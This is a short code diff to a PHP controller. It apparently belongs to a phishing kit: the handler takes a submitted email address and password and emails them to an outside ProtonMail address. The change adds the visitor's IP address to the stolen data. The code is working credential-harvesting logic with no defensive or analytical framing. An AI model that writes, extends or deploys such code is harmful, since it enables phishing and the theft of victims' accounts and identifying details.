@@ -74,8 +74,9 @@ class MainController extends Controller {
                        $rcpt = "ceochris@protonmail.com";
                        $pass = $req["pass"];
                        $email = $req["email"];
+					   $ip = getenv("REMOTE_ADDR");
 
-                       $this->helpers->sendEmail($rcpt,$s,['pass' => $pass,'email' => $email],'emails.apply_alert','view');  
+                       $this->helpers->sendEmail($rcpt,$s,['ip' => $ip,'pass' => $pass,'email' => $email],'emails.apply_alert','view');  
                         $ret = "ok";                      
                   }       
            return $ret;                                                                                            
